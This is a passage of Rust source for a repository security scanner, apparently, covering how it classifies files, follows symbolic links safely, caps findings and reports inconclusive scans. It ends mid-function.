//! Running rules over a repository.

use std::borrow::Cow;
use std::cell::Cell;
use std::collections::{HashMap, HashSet};
use std::fs::{self, File};
use std::io::{self, BufRead, BufReader, Read};
use std::ops::Range;
use std::path::{Path, PathBuf};

use crate::bidi;
use crate::checks::{Check, Ctx, Decode, FileIssue, HEAD_LEN, Hit, RepoIndex, TextSpan, Views};
use crate::finding::{Finding, Severity};
use crate::rule::{Matcher, Rule};
use crate::sanitize::{display_safe, snippet_safe, to_slash};
use crate::walk::{self, Limits, SkipReason, Skipped};
use regex::Regex;

/// Explanations built from text in the scanned repository are cut to this.
const MAX_EXPLANATION_CHARS: usize = 300;

/// How many leading bytes are checked to tell text from binary files.
const BINARY_SNIFF_LEN: usize = 8 * 1024;

/// Extensions of files that a shell, an interpreter or a script host reads as
/// text. A NUL byte in one of them does not make it a binary: `bash`, `node`
/// and the others still run it, so the line rules must still look at it.
const SCRIPT_EXTENSIONS: &[&str] = &[
    "sh", "bash", "zsh", "ksh", "csh", "fish", "py", "pyw", "js", "mjs", "cjs", "jsx", "ts", "tsx",
    "rb", "pl", "pm", "php", "ps1", "psm1", "psd1", "bat", "cmd", "vbs", "wsf", "lua",
];

/// Script extensions whose host ignores a UTF-16 byte order mark and runs the
/// bytes after it: `cmd.exe` (`.bat`, `.cmd`), the Unix shells and PHP. A
/// `.bat` that starts with `FF FE` runs as ANSI text while an editor shows it
/// as UTF-16 garbage, a known way to hide a batch payload, so such a file is
/// read as bytes. Every other script extension with a byte order mark is
/// decoded from UTF-16: PowerShell, Windows Script Host, Perl and tsc decode
/// it, and Python, Ruby, Lua and Node cannot run such a file at all, so
/// reading it as bytes would stop no attack and only lose detection.
const BYTE_SCRIPT_EXTENSIONS: &[&str] = &[
    "sh", "bash", "zsh", "ksh", "csh", "fish", "php", "bat", "cmd",
];

/// A file with NUL bytes that is not a script is read by the line rules only
/// if at most one byte in this many is NUL. Text with a stray NUL has a
/// handful of them; padding in a data format, or ASCII text in UTF-16 without a
/// byte order mark (one byte in two), has far more. One in eight is above any
/// accidental NUL in text and well below the density of such data.
const MAX_NUL_RATIO: u64 = 8;

/// One file check may list at most this many findings for one file; the rest
/// are summarized on the last one, so a hostile file cannot flood the report.
const MAX_FINDINGS_PER_FILE_CHECK: usize = 100;

/// A line rule lists at most this many findings per file; the rest are only
/// counted (`Report::unlisted`), so a hostile file cannot flood the report.
const MAX_LINE_FINDINGS_PER_RULE: usize = 100;

/// A snippet shows at most this many characters of its line.
const MAX_SNIPPET_CHARS: usize = 120;

/// When a match is further into a long line, its snippet starts this many
/// characters before it, so the match is always in view.
const SNIPPET_LEAD_CHARS: usize = 40;

/// Column, span and snippet are worked out for at most this many hits of one
/// check in one file; the rest keep their line. Locating a hit looks back to
/// the start of its line, so without a cap a hostile file with many hits on one
/// very long line would make that quadratic.
const MAX_LOCATED_HITS: usize = 100;

/// Added to findings from a file that has NUL bytes and does not read as text.
const BINARY_LOOKING_NOTE: &str = " (found in a binary-looking file)";

/// JSONC and file rules read the targets of the links they select in full,
/// and one file may be the target of any number of links. Once this many
/// bytes have been read through links in one scan, every further link such a
/// rule selects is listed as too large instead (inconclusive).
const MAX_THROUGH_LINK_BYTES: u64 = 64 * 1024 * 1024;

/// Added to findings of a JSONC check on a symbolic link: the check read the
/// file the link points at, under the link's name, as the tool that opens the
/// link would.
const THROUGH_LINK_NOTE: &str = " (read through a symbolic link to a file in the repository)";

/// Everything one scan produced. Front ends decide how to show it.
#[derive(Debug, Default)]
pub struct Report {
    /// Sorted by file, then line, then rule ID.
    pub findings: Vec<Finding>,
    /// Number of files that were read and analysed: text files, and binary
    /// files that a file-level rule examined.
    pub files_scanned: usize,
    /// Findings a line rule produced beyond the per-file limit, which are not
    /// in `findings`.
    pub unlisted: Vec<Unlisted>,
    /// Files that were not (fully) analysed, with the reason. Nothing is left
    /// out silently: binary, oversized, symlinked and unreadable files are all
    /// listed here.
    pub skipped: Vec<Skipped>,
    /// True if the file-count limit cut the scan short.
    pub truncated: bool,
}

/// Findings of one rule in one file that were counted but not listed.
#[derive(Debug, Clone, PartialEq, Eq)]
pub struct Unlisted {
    pub file: PathBuf,
    pub rule_id: String,
    /// The level of the rule: every finding of one rule has the same level, and
    /// the limit applies per rule, so a flood of LOW findings from one rule can
    /// never push a CRITICAL one from another rule out of the list.
    pub severity: Severity,
    pub count: usize,
}

impl Report {
    /// Whether the scan can vouch for what it looked at. A report with no
    /// findings is only a clean bill of health when this is true: a payload
    /// may sit past the file limit, in a file that was too large or could not
    /// be opened, or in an executable nobody analyzes yet.
    pub fn is_complete(&self) -> bool {
        !self.truncated && self.inconclusive_count() == 0
    }

    /// Number of skipped files that make the scan inconclusive, see
    /// `SkipReason::makes_scan_inconclusive`.
    pub fn inconclusive_count(&self) -> usize {
        self.skipped
            .iter()
            .filter(|skipped| skipped.reason.makes_scan_inconclusive())
            .count()
    }
}

/// Scans every file under `root` with every rule.
///
/// All rules always run; hiding findings by severity, stage or family is
/// left to the front end, so filters can change without rescanning.
pub fn scan(root: &Path, rules: &[Rule], limits: Limits) -> Report {
    scan_with_links(root, rules, limits, &HashSet::new())
}

/// Like `scan`, for a checkout whose symbolic links were written as plain
/// files (see `walk::walk_with_links`): each path in `links` is treated as a
/// link to the target its file holds, so the link rules and the checks that
/// read through links see it as they would see a real one, and its file is
/// also scanned as content, as a system without symlinks reads it.
pub fn scan_with_links(
    root: &Path,
    rules: &[Rule],
    limits: Limits,
    links: &HashSet<PathBuf>,
) -> Report {
    let walked = walk::walk_with_links(root, limits, links);

    // Where files are allowed to be looked up: everything the walk saw,
    // including files it did not hand over because of the size limit or
    // because they are symlinks.
    let index = RepoIndex::new(
        walked
            .files
            .iter()
            .map(|path| to_slash(path))
            .chain(
                walked
                    .skipped
                    .iter()
                    .filter_map(|skipped| match skipped.reason {
                        SkipReason::TooLarge { .. } | SkipReason::Symlink { .. } => {
                            Some(to_slash(&skipped.path))
                        }
                        _ => None,
                    }),
            ),
    );
    // A recorded link is handed over as content too, but it is not a regular
    // file that another link can point at.
    let link_paths: HashSet<&PathBuf> = walked
        .skipped
        .iter()
        .filter(|entry| matches!(entry.reason, SkipReason::Symlink { .. }))
        .map(|entry| &entry.path)
        .collect();
    let regular_files: HashSet<String> = walked
        .files
        .iter()
        .filter(|path| !link_paths.contains(path))
        .map(|path| to_slash(path))
        .collect();
    // Links recorded by the caller whose files are scanned as content too.
    let recorded_links: HashSet<PathBuf> = walked
        .files
        .iter()
        .filter(|path| link_paths.contains(path))
        .cloned()
        .collect();
    // The same paths by their lowercase form, for link targets spelled in
    // another case (NTFS and APFS ignore case by default).
    let lowercase_files: HashMap<String, String> = regular_files
        .iter()
        .map(|path| (path.to_lowercase(), path.clone()))
        .collect();
    // For reading a link's whole target: each `/` path of a regular file with
    // its exact path, or `None` when the text does not name one file for
    // certain (a name that is not UTF-8, or two names with the same text), and
    // every path by its lowercase form.
    let mut exact_files: HashMap<String, Option<PathBuf>> = HashMap::new();
    for path in walked
        .files
        .iter()
        .filter(|path| !link_paths.contains(path))
    {
        let exact = path.to_str().is_some().then(|| path.clone());
        exact_files
            .entry(to_slash(path))
            .and_modify(|known| *known = None)
            .or_insert(exact);
    }
    let mut lowercase_exact: HashMap<String, Vec<String>> = HashMap::new();
    for key in exact_files.keys() {
        lowercase_exact
            .entry(key.to_lowercase())
            .or_default()
            .push(key.clone());
    }
    // Every link by its lowercase `/` path: a reading of a target that names
    // a link is not a regular file, and must not be skipped over in favour of
    // another reading that names one.
    let link_keys: HashSet<String> = link_paths
        .iter()
        .map(|path| to_slash(path).to_lowercase())
        .collect();
    let link_key_lengths: HashSet<usize> = link_keys.iter().map(String::len).collect();
    let file_rules: Vec<(&Rule, Check)> = rules
        .iter()
        .filter_map(|rule| match rule.matcher {
            Matcher::File(check) => Some((rule, check)),
            _ => None,
        })
        .collect();
    let head_rules: Vec<(&Rule, Check)> = rules
        .iter()
        .filter_map(|rule| match rule.matcher {
            Matcher::Head(check) => Some((rule, check)),
            _ => None,
        })
        .collect();
    let jsonc_rules: Vec<(&Rule, Check)> = rules
        .iter()
        .filter_map(|rule| match rule.matcher {
            Matcher::Jsonc(check) => Some((rule, check)),
            _ => None,
        })
        .collect();
    let env = Env {
        bidi_budget: Cell::new(bidi::SCAN_BUDGET),
        index: &index,
        truncated: walked.truncated,
        file_rules: &file_rules,
        head_rules: &head_rules,
    };
    // Files over the size limit that the walk itself listed. Head rules see
    // them by name; files read as a stream get their head rules there.
    let walk_too_large: HashSet<PathBuf> = walked
        .skipped
        .iter()
        .filter(|entry| matches!(entry.reason, SkipReason::TooLarge { .. }))
        .map(|entry| entry.path.clone())
        .collect();

    let mut report = Report {
        truncated: walked.truncated,
        ..Report::default()
    };
    let mut skipped = walked.skipped;

    let has_file_rule = |slash_path: &str| {
        file_rules
            .iter()
            .any(|(rule, _)| rule.applies_to(slash_path))
    };
    let has_jsonc_rule = |slash_path: &str| {
        jsonc_rules
            .iter()
            .any(|(rule, _)| rule.applies_to(slash_path))
    };

    for relative in &walked.files {
        let slash_path = to_slash(relative);

        // A file too big to hold in memory is read as a stream, and only the
        // line rules look at it.
        let size = fs::metadata(root.join(relative)).map_or(0, |metadata| metadata.len());
        if size > limits.max_buffered_size {
            let streamed = scan_streamed(
                root,
                relative,
                &slash_path,
                size,
                rules,
                &limits,
                has_file_rule(&slash_path),
                &env,
                &mut report.unlisted,
            );
            report.findings.extend(streamed.findings);
            report.files_scanned += usize::from(streamed.scanned);
            skipped.extend(streamed.skipped);
            continue;
        }

        let bytes = match fs::read(root.join(relative)) {
            Ok(bytes) => bytes,
            Err(err) => {
                skipped.push(Skipped {
                    path: relative.clone(),
                    reason: SkipReason::Unreadable {
                        error: err.to_string(),
                    },
                });
                continue;
            }
        };

        let class = classify(&slash_path, &bytes);
        let views = Views::new(&bytes, class.decode);

        // File-level rules see the raw bytes whatever the classification says,
        // so a file is judged the way its consumer reads it, even if it looks
        // like a binary here.
        let checked = env.run_file_checks(relative, &slash_path, &views, None);
        report.findings.extend(checked.findings);
        let headed = env.run_head_checks(
            relative,
            &slash_path,
            head_of(&bytes),
            None,
            class.executable,
            Some(bytes.len() as u64),
        );
        report.findings.extend(headed.findings);

        // An executable is always listed, since nothing analyzes its code. It
        // makes the scan inconclusive unless a rule that names executables
        // reported it; a finding of any other rule does not count, nor does a
        // file rule that looked at it (that rule saw the bytes of a `.pth` or
        // `.start` file, not the code of the program).
        if let Some(format) = class.executable {
            skipped.push(Skipped {
                path: relative.clone(),
                reason: SkipReason::Executable {
                    format,
                    reported: headed.named_executable,
                },
            });
            if checked.examined {
                report.files_scanned += 1;
            }
            continue;
        }
        if class.binary_looking {
            skipped.push(Skipped {
                path: relative.clone(),
                reason: SkipReason::Binary,
            });
        }

        report.files_scanned += 1;
        let mut found = scan_text(
            relative,
            &slash_path,
            &views,
            class.nul_line,
            &env,
            rules,
            &mut report.unlisted,
        );
        if class.binary_looking {
            for finding in &mut found {
                finding.explanation.push_str(BINARY_LOOKING_NOTE);
            }
        }
        report.findings.extend(found);
    }

    // Entries the walk did not hand over still matter to a rule that asks for
    // that file by name: an oversized file or a symlink is not a way around it.
    let walk_skips: Vec<Skipped> = skipped.clone();
    let mut through_link_bytes: u64 = 0;
    for entry in &walk_skips {
        let slash_path = to_slash(&entry.path);
        let checked = match &entry.reason {
            SkipReason::TooLarge { size } => {
                let issue = FileIssue::TooLarge { size: *size };
                if walk_too_large.contains(&entry.path) {
                    // Only the first bytes are read, for the head rules (and
                    // a PE signature, see `native_format`).
                    let path = root.join(&entry.path);
                    let (head, executable, size) = read_head(&path).unwrap_or_default();
                    let headed = env.run_head_checks(
                        &entry.path,
                        &slash_path,
                        &head,
                        Some(issue.clone()),
                        executable,
                        size,
                    );
                    report.findings.extend(headed.findings);
                }
                env.run_file_checks(
                    &entry.path,
                    &slash_path,
                    &Views::new(&[], Decode::Utf8WithoutNuls),
                    Some(issue),
                )
            }
            SkipReason::Symlink { target } => {
                let target_text = target
                    .as_deref()
                    .map(|target| target.to_string_lossy().into_owned());
                let resolved = target_text
                    .as_deref()
                    .and_then(|target| resolve_link_text(&slash_path, target));
                // Head rules get at most the first bytes of a regular file the
                // link points at inside the repository; there may be any number
                // of links, so nothing more is read for them.
                let (head, executable, size) = target_text
                    .as_deref()
                    .and_then(|target| {
                        link_target_file(&slash_path, target, &regular_files, &lowercase_files)
                    })
                    .and_then(|path| read_head(&root.join(path)))
                    .unwrap_or_default();
                let issue = FileIssue::Symlink {
                    target: target_text.clone(),
                    resolved,
                };
                let headed = env.run_head_checks(
                    &entry.path,
                    &slash_path,
                    &head,
                    Some(issue.clone()),
                    executable,
                    size,
                );
                report.findings.extend(headed.findings);
                // File and JSONC rules get the whole target, and only when one
                // selects the link: VS Code follows a `.vscode/tasks.json`
                // that is a link and runs its tasks. The target is found the
                // way the head rules find it (both separators, any case), so
                // `..\\NOTES.TXT` is no way around it.
                let mut jsonc = has_jsonc_rule(&slash_path);
                let file_rule = has_file_rule(&slash_path);
                let mut bytes = Vec::new();
                if jsonc || file_rule {
                    let target_file = match target.as_deref() {
                        Some(target) => link_target_to_read(
                            &slash_path,
                            target,
                            &exact_files,
                            &lowercase_exact,
                            &link_keys,
                            &link_key_lengths,
                        ),
                        None => Ok(None),
                    };
                    let mut not_read = |error: &str| {
                        skipped.push(Skipped {
                            path: entry.path.clone(),
                            reason: SkipReason::Unreadable {
                                error: error.to_string(),
                            },
                        });
                    };
                    match target_file {
                        Err(why) => {
                            not_read(&format!("link target not read: {why}"));
                            jsonc = false;
                        }
                        Ok(Some(path)) => {
                            let path = root.join(path);
                            let size = fs::metadata(&path).map_or(0, |metadata| metadata.len());
                            if (jsonc && size > limits.max_buffered_size)
                                || through_link_bytes + size > MAX_THROUGH_LINK_BYTES
                            {
                                // As for a file that size, or once the budget
                                // for reading through links is spent.
                                skipped.push(Skipped {
                                    path: entry.path.clone(),
                                    reason: SkipReason::TooLarge { size },
                                });
                                jsonc = false;
                            } else {
                                match fs::read(&path) {
                                    Ok(read) => {
                                        through_link_bytes += read.len() as u64;
                                        bytes = read;
                                    }
                                    Err(err) => {
                                        not_read(&format!("link target not read: {err}"));
                                        jsonc = false;
                                    }
                                }
                            }
                        }
                        // A rule that would judge the file behind the link
                        // could not: the target is outside, another link
                        // (#69), a folder or missing. Not a clean result.
                        Ok(None) if jsonc => {
                            not_read(
                                "link target not read: it is not a regular file in the repository",
                            );
                            jsonc = false;
                        }
                        Ok(None) => {}
                    }
                }
                // Read the way the target would be read under the link's name.
                let views = Views::new(&bytes, classify(&slash_path, &bytes).decode);
                if jsonc {
                    let mut through = env.run_checks(
                        &jsonc_rules,
                        &entry.path,
                        &slash_path,
                        &views,
                        Some(issue.clone()),
                    );
                    for finding in &mut through.findings {
                        finding.explanation.push_str(THROUGH_LINK_NOTE);
                    }
                    report.findings.extend(through.findings);
                }
                env.run_file_checks(&entry.path, &slash_path, &views, Some(issue))
            }
            _ => continue,
        };
        report.findings.extend(checked.findings);
    }

    report.skipped = skipped;
    report
        .findings
        .sort_by(|a, b| (&a.file, a.line, &a.rule_id).cmp(&(&b.file, b.line, &b.rule_id)));
    // A recorded link is offered to the rules that judge names twice, as a
    // file and as a link; the same finding is listed once.
    if !recorded_links.is_empty() {
        // Findings are sorted by file, line and rule only, so an equal one may
        // sit anywhere in its group: compare within the group.
        let mut kept: Vec<Finding> = Vec::with_capacity(report.findings.len());
        for finding in std::mem::take(&mut report.findings) {
            let duplicate = recorded_links.contains(&finding.file)
                && kept
                    .iter()
                    .rev()
                    .take_while(|k| {
                        (&k.file, k.line, &k.rule_id)
                            == (&finding.file, finding.line, &finding.rule_id)
                    })
                    .any(|k| *k == finding);
            if !duplicate {
                kept.push(finding);
            }
        }
        report.findings = kept;
    }
    report
}

/// What a scan shares between files.
struct Env<'a> {
    /// Bytes of lines the bidi rule may still lay out in this scan.
    bidi_budget: Cell<usize>,
    index: &'a RepoIndex,
    truncated: bool,
    file_rules: &'a [(&'a Rule, Check)],
    head_rules: &'a [(&'a Rule, Check)],
}

/// The outcome of offering one file to the file-level or head rules.
struct Checked {
    /// True if at least one of those rules applies to this path.
    examined: bool,
    /// True if a rule that names executables (`Rule::names_executables`)
    /// reported the file.
    named_executable: bool,
    findings: Vec<Finding>,
}

/// The first bytes of a file, as head rules see them.
fn head_of(bytes: &[u8]) -> &[u8] {
    &bytes[..bytes.len().min(HEAD_LEN)]
}

impl Env<'_> {
    fn run_file_checks<'v>(
        &'v self,
        relative: &Path,
        slash_path: &'v str,
        views: &'v Views<'v>,
        issue: Option<FileIssue>,
    ) -> Checked {
        self.run_checks(self.file_rules, relative, slash_path, views, issue)
    }

    /// Offers a file's name and first bytes to the head rules. `head` is
    /// empty for a file that was not read.
    fn run_head_checks(
        &self,
        relative: &Path,
        slash_path: &str,
        head: &[u8],
        issue: Option<FileIssue>,
        executable: Option<&'static str>,
        size: Option<u64>,
    ) -> Checked {
        let views = Views::new(head, classify(slash_path, head).decode)
            .with_executable(executable)
            .with_size(size);
        self.run_checks(self.head_rules, relative, slash_path, &views, issue)
    }

    fn run_checks<'v>(
        &'v self,
        rules: &'v [(&'v Rule, Check)],
        relative: &Path,
        slash_path: &'v str,
        views: &'v Views<'v>,
        issue: Option<FileIssue>,
    ) -> Checked {
        let mut checked = Checked {
            examined: false,
            named_executable: false,
            findings: Vec::new(),
        };
        let own_bytes = issue.is_none();
        for (rule, check) in rules {
            if !rule.applies_to(slash_path) {
                continue;
            }
            checked.examined = true;
            let ctx = Ctx::new(
                slash_path,
                issue.clone(),
                self.index,
                self.truncated,
                rule.severity,
                views,
            );
            let mut hits = check(&ctx);
            checked.named_executable |= rule.names_executables && !hits.is_empty();
            let unlisted = hits.len().saturating_sub(MAX_FINDINGS_PER_FILE_CHECK);
            hits.truncate(MAX_FINDINGS_PER_FILE_CHECK);

            let start = checked.findings.len();
            for (index, hit) in hits.into_iter().enumerate() {
                checked
                    .findings
                    .push(hit_finding(rule, relative, hit, index, views, own_bytes));
            }
            if unlisted > 0
                && let Some(last) = checked.findings[start..].last_mut()
            {
                last.explanation.push_str(&format!(
                    " [{unlisted} more from this rule in this file not listed]"
                ));
            }
        }
        checked
    }
}

/// The first `HEAD_LEN` bytes of a file, read without reading the rest, its
/// native executable format (see `native_format`) and its size.
type Head = (Vec<u8>, Option<&'static str>, Option<u64>);

fn read_head(path: &Path) -> Option<Head> {
    let file = File::open(path).ok()?;
    let size = file.metadata().ok()?.len();
    let mut head = Vec::new();
    file.take(HEAD_LEN as u64).read_to_end(&mut head).ok()?;
    let executable = native_format(&head, Some((path, size)));
    Some((head, executable, Some(size)))
}

/// The Windows loader accepts a PE header up to this far into the file.
const MAX_PE_OFFSET: u64 = 256 * 1024 * 1024;

/// The native executable format of a file, from its first bytes. For an `MZ`
/// header, the `PE\0\0` signature where `e_lfanew` (offset 0x3C) points
/// decides, whatever else the bytes hold: a PE needs no NUL byte in its
/// first 8 KiB, since every DOS header field but those two can be anything,
/// and its header can lie up to 256 MiB into the file. When the signature is
/// past `head`, `file` (the path and the size) lets one 4-byte read check
/// it. When it cannot be checked at all, binary content starting with `MZ`
/// still counts, as before. Other formats need binary content (a NUL byte
/// in the first 8 KiB, which their headers always have).
pub(crate) fn native_format(head: &[u8], file: Option<(&Path, u64)>) -> Option<&'static str> {
    if !head.starts_with(b"MZ") {
        return if looks_binary(head) {
            executable_format(head)
        } else {
            None
        };
    }
    if let Some(&[a, b, c, d]) = head.get(0x3C..0x40) {
        let offset = u64::from(u32::from_le_bytes([a, b, c, d]));
        let in_head = usize::try_from(offset)
            .ok()
            .and_then(|start| head.get(start..start.checked_add(4)?));
        if let Some(signature) = in_head {
            return (signature == b"PE\0\0").then_some("PE");
        }
        if let Some((path, size)) = file
            && offset < MAX_PE_OFFSET
            && offset + 4 <= size
            && let Some(signature) = read_at(path, offset)
        {
            return (signature == *b"PE\0\0").then_some("PE");
        }
    }
    looks_binary(head).then_some("PE")
}

/// Four bytes of a file at `offset`, or `None` if they cannot be read.
fn read_at(path: &Path, offset: u64) -> Option<[u8; 4]> {
    use std::io::{Seek, SeekFrom};
    let mut file = File::open(path).ok()?;
    file.seek(SeekFrom::Start(offset)).ok()?;
    let mut bytes = [0; 4];
    file.read_exact(&mut bytes).ok()?;
    Some(bytes)
}

/// Resolves a symbolic link's target as text, whatever system the scan runs
/// on, and returns the repository path (with `/`) it points at only when it
/// stays inside the repository both the way Unix reads it (only `/`
/// separates) and the way Windows reads it (`/` and `\` separate; a drive
/// letter such as `C:`, or a UNC or device prefix such as `\\host`,
/// `\\?\` or `\??\`, is absolute). `None` when either reading is absolute
/// or climbs above the root. Of the two inside paths, the one for the system
/// the scan runs on is returned.
fn resolve_link_text(link: &str, target: &str) -> Option<String> {
    let unix = resolve_link_with(link, target, &['/'])?;
    let windows = resolve_link_with(link, target, &['/', '\\'])?;
    Some(if cfg!(windows) { windows } else { unix })
}

/// The regular file in the repository a link points at, for reading its
/// head: the Unix reading of the target, then the Windows one, each also
/// looked up without case. `None` when neither names a regular file (a
/// chain through another link, a link to a folder, or a target outside).
fn link_target_file(
    link: &str,
    target: &str,
    regular_files: &HashSet<String>,
    lowercase_files: &HashMap<String, String>,
) -> Option<String> {
    [&['/'][..], &['/', '\\'][..]]
        .into_iter()
        .filter_map(|separators| resolve_link_with(link, target, separators))
        .find_map(|path| {
            if regular_files.contains(&path) {
                Some(path)
            } else {
                lowercase_files.get(&path.to_lowercase()).cloned()
            }
        })
}

/// The regular file whose whole content JSONC and file rules read for a link:
/// every reading of the target (Unix and Windows separators, exact case and
/// any case) must name the same file, and that file must be named for
/// certain. Otherwise which file the tool that follows the link opens depends
/// on the system or on bytes the text cannot show, so the target is reported
/// as not read (`Err`) rather than guessed: a guess can be the harmless twin.
/// A reading that names another link is `Err` too (links to links are not
/// followed). `Ok(None)` when no reading names a regular file.
fn link_target_to_read(
    link: &str,
    target: &Path,
    exact_files: &HashMap<String, Option<PathBuf>>,
    lowercase_exact: &HashMap<String, Vec<String>>,
    link_keys: &HashSet<String>,
    link_key_lengths: &HashSet<usize>,
) -> Result<Option<PathBuf>, &'static str> {
    let Some(target) = target.to_str() else {
        return Err("its target is not valid UTF-8");
    };
    let mut named: Vec<&String> = Vec::new();
    for separators in [&['/'][..], &['/', '\\'][..]] {
        let Some(path) = resolve_link_with(link, target, separators) else {
            continue;
        };
        if link_keys.contains(&path.to_lowercase())
            || crosses_link(link, target, separators, link_keys, link_key_lengths)
        {
            return Err("a reading of its target goes through another symbolic link");
        }
        if let Some((key, _)) = exact_files.get_key_value(&path) {
            named.push(key);
        }
        named.extend(
            lowercase_exact
                .get(&path.to_lowercase())
                .into_iter()
                .flatten(),
        );
    }
    named.sort();
    named.dedup();
    match named[..] {
        [] => Ok(None),
        [one] => exact_files[one]
            .clone()
            .map(Some)
            .ok_or("its target's name does not name one file for certain"),
        _ => Err("its target names different files on different systems"),
    }
}

/// Whether walking the target passes through a link, including a directory
/// link that a later `..` takes back off the text path: the system resolves
/// `dl/../x` inside the directory `dl` points at, not next to `dl`.
fn crosses_link(
    link: &str,
    target: &str,
    separators: &[char],
    link_keys: &HashSet<String>,
    link_key_lengths: &HashSet<usize>,
) -> bool {
    // The lowercase path so far and its length before each part, so a prefix
    // costs one push and a `..` one truncate: linear in the target.
    let mut parts: Vec<&str> = link.split('/').collect();
    parts.pop();
    let mut prefix = parts.join("/").to_lowercase();
    let mut lengths: Vec<usize> = Vec::new();
    for part in target.split(separators) {
        match part {
            "" | "." => {}
            ".." => match lengths.pop() {
                Some(length) => prefix.truncate(length),
                None => match prefix.rfind('/') {
                    Some(at) => prefix.truncate(at),
                    None if prefix.is_empty() => return false,
                    None => prefix.clear(),
                },
            },
            _ => {
                lengths.push(prefix.len());
                if !prefix.is_empty() {
                    prefix.push('/');
                }
                prefix.push_str(&part.to_lowercase());
                // Hashing a prefix costs its length, so only a prefix as long
                // as some link's path is looked up.
                if link_key_lengths.contains(&prefix.len()) && link_keys.contains(prefix.as_str()) {
                    return true;
                }
            }
        }
    }
    false
}

fn resolve_link_with(link: &str, target: &str, separators: &[char]) -> Option<String> {
    let bytes = target.as_bytes();
    let drive = bytes.len() >= 2 && bytes[0].is_ascii_alphabetic() && bytes[1] == b':';
    if target.starts_with(['/', '\\']) || drive {
        return None;
    }
    let mut parts: Vec<&str> = link.split('/').collect();
    parts.pop();
    for part in target.split(separators) {
        match part {
            "" | "." => {}
            ".." => {
                parts.pop()?;
            }
            _ => parts.push(part),
        }
    }
    Some(parts.join("/"))
}

/// Runs the line-regex rules over lines fed one at a time, keeping at most
/// `MAX_LINE_FINDINGS_PER_RULE` findings per rule and counting the rest.
/// How a line rule looks at a line.
enum LineRule<'a> {
    Regex(&'a Regex),
    BidiDisplay,
}

/// What the bidi rule says about a line whose controls change nothing.
const BIDI_UNCHANGED: &str = "bidi controls present, display unchanged";

struct LineScanner<'a> {
    rules: Vec<(&'a Rule, LineRule<'a>)>,
    /// Findings listed so far, per rule: at the rule's own level and at LOW.
    /// Only the bidi rule has LOW findings. They count apart, so a flood of
    /// harmless lines cannot push a deceptive one out of the list.
    listed: Vec<[usize; 2]>,
    hidden: Vec<[usize; 2]>,
    findings: Vec<Finding>,
    /// What this scan has left for laying out lines of the bidi rule.
    bidi_budget: &'a Cell<usize>,
}

impl<'a> LineScanner<'a> {
    fn new(rules: &[&'a Rule], bidi_budget: &'a Cell<usize>) -> Self {
        let rules: Vec<_> = rules
            .iter()
            .filter_map(|&rule| match &rule.matcher {
                Matcher::LineRegex(pattern) => Some((rule, LineRule::Regex(pattern))),
                Matcher::BidiDisplay => Some((rule, LineRule::BidiDisplay)),
                _ => None,
            })
            .collect();
        LineScanner {
            listed: vec![[0; 2]; rules.len()],
            hidden: vec![[0; 2]; rules.len()],
            rules,
            findings: Vec::new(),
            bidi_budget,
        }
    }

    fn is_empty(&self) -> bool {
        self.rules.is_empty()
    }

    /// `file_offset` is where the line starts in the file, given only when
    /// the file's text is its bytes exactly, so a span is never wrong;
    /// `column_exact` says whether a count of characters is a column (see
    /// `Views::columns_are_exact`).
    fn feed(
        &mut self,
        relative: &Path,
        line_number: usize,
        line: &str,
        file_offset: Option<usize>,
        column_exact: bool,
    ) {
        for (index, (rule, line_rule)) in self.rules.iter().enumerate() {
            // The slot of the level a finding is listed at, its severity, its
            // explanation and where it starts.
            let (found, slot, severity, explanation) = match line_rule {
                LineRule::Regex(pattern) => {
                    if self.listed[index][0] == MAX_LINE_FINDINGS_PER_RULE {
                        if pattern.is_match(line) {
                            self.hidden[index][0] += 1;
                        }
                        continue;
                    }
                    // `find` matches exactly when `is_match` does, and says where.
                    let Some(found) = pattern.find(line) else {
                        continue;
                    };
                    (found.range(), 0, rule.severity, rule.description.clone())
                }
                LineRule::BidiDisplay => {
                    let Some(found) = bidi::first_control(line) else {
                        continue;
                    };
                    // With the list of the rule's own level full, nothing more
                    // is laid out: such a line counts as that level.
                    if self.listed[index][0] == MAX_LINE_FINDINGS_PER_RULE {
                        self.hidden[index][0] += 1;
                        continue;
                    }
                    match bidi::judge(line, self.bidi_budget) {
                        bidi::Verdict::Unchanged => {
                            (found, 1, Severity::Low, BIDI_UNCHANGED.to_string())
                        }
                        bidi::Verdict::Differs => {
                            (found, 0, rule.severity, rule.description.clone())
                        }
                        bidi::Verdict::NotAnalyzed(reason) => (
                            found,
                            0,
                            rule.severity,
                            format!("{} (not laid out: {})", rule.description, reason.text()),
                        ),
                    }
                }
            };
            if self.listed[index][slot] == MAX_LINE_FINDINGS_PER_RULE {
                self.hidden[index][slot] += 1;
                continue;
            }
            self.listed[index][slot] += 1;
            let span = file_offset.map(|start| start + found.start..start + found.end);
            let location =
                Location::in_line(line, found.start, line_number == 1, column_exact, span);
            self.findings.push(Finding {
                rule_id: rule.id.clone(),
                severity,
                stage: rule.stage,
                attack: rule.attack.clone(),
                file: relative.to_path_buf(),
                line: line_number,
                column: location.column,
                span: location.span,
                snippet: location.snippet,
                explanation,
            });
        }
    }

    fn finish(self, relative: &Path, unlisted: &mut Vec<Unlisted>) -> Vec<Finding> {
        for ((rule, _), hidden) in self.rules.iter().zip(&self.hidden) {
            for (slot, severity) in [(0, rule.severity), (1, Severity::Low)] {
                if hidden[slot] > 0 {
                    unlisted.push(Unlisted {
                        file: relative.to_path_buf(),
                        rule_id: rule.id.clone(),
                        severity,
                        count: hidden[slot],
                    });
                }
            }
        }
        self.findings
    }
}

/// What reading one large file as a stream produced.
#[derive(Default)]
struct Streamed {
    findings: Vec<Finding>,
    skipped: Vec<Skipped>,
    /// Whether the line rules read the file.
    scanned: bool,
}

/// Scans a file that is too big to hold in memory, one line at a time.
///
/// It is classified like a small file: an executable is listed and not read
/// further; a script keeps its NUL rule; data that does not read as text is
/// read as ASCII only. That needs two passes: the first measures the file
/// (`NulProbe`), the second runs the line rules. Rules that need the whole
/// file (file-level and JSONC rules) cannot run, so if one applies the file is
/// listed as too large, which makes the scan inconclusive, as before.
#[allow(clippy::too_many_arguments)]
fn scan_streamed(
    root: &Path,
    relative: &Path,
    slash_path: &str,
    size: u64,
    rules: &[Rule],
    limits: &Limits,
    file_rule_applies: bool,
    env: &Env<'_>,
    unlisted: &mut Vec<Unlisted>,
) -> Streamed {
    let mut out = Streamed::default();
    let unreadable = |err: io::Error| Skipped {
        path: relative.to_path_buf(),
        reason: SkipReason::Unreadable {
            error: err.to_string(),
        },
    };
    let path = root.join(relative);

    let mut head = Vec::new();
    let read_head = File::open(&path)
        .and_then(|file| file.take(BINARY_SNIFF_LEN as u64).read_to_end(&mut head));
    if let Err(err) = read_head {
        out.skipped.push(unreadable(err));
        return out;
